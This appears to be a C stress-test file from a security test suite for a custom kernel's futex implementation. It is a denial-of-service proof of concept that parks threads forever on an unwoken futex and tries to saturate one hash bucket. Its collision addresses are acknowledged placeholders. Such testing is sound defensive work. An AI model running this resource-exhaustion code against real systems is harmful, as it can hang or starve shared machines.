/*
 * futex_park.c — DoS stress: futex permanent wait.
 *
 * Covers:
 *   ATTACK-DOS-015  FUTEX_WAIT on a uaddr nobody wakes, timeout=0 (infinite).
 *                   Because park_slot() has the *uaddr != val spurious-wake
 *                   check COMMENTED OUT (futex.rs:296), the thread spins
 *                   forever. Thread slot stays in_use=true permanently.
 *   ATTACK-DOS-016  Queue saturation — crank up many threads hashing to the
 *                   same bucket.
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>

static inline long sys_futex(uint32_t *uaddr, int op, uint32_t val,
                             const struct timespec *to,
                             uint32_t *uaddr2, uint32_t val3) {
    return syscall(SYS_futex, uaddr, op, val, to, uaddr2, val3);
}

static uint32_t g_fut;

static void *waiter(void *arg) {
    uint32_t *addr = (uint32_t*)arg;
    uint32_t v = *addr;
    /* Infinite wait — no wake is ever issued. */
    long r = sys_futex(addr, FUTEX_WAIT, v, NULL, NULL, 0);
    fprintf(stderr, "[futex_park] waiter unexpectedly returned %ld\n", r);
    return NULL;
}

int main(int argc, char **argv) {
    const char *mode = (argc > 1) ? argv[1] : "one";
    g_fut = 0xDEADBEEF;

    if (!strcmp(mode, "one")) {
        fprintf(stderr, "[futex_park] parking one thread on &g_fut forever\n");
        waiter(&g_fut);
    } else if (!strcmp(mode, "bucket")) {
        /* Pick 32+ addresses that collide in bucket_index(). The hash is
           public (futex.rs:160). These are candidate colliders; in real
           testing, compute them with the same mix function. */
        static uint32_t addrs[64];
        for (int i = 0; i < 64; i++) addrs[i] = 1;
        for (int i = 0; i < 33; i++) {
            pthread_t t;
            pthread_create(&t, NULL, waiter, &addrs[i]);
            pthread_detach(t);
        }
        fprintf(stderr, "[futex_park] 33 waiters dispatched; 33rd should ENOSPC if colliding\n");
        for (;;) sleep(3600);
    } else {
        fprintf(stderr, "usage: %s [one|bucket]\n", argv[0]);
        return 2;
    }
    return 0;
}
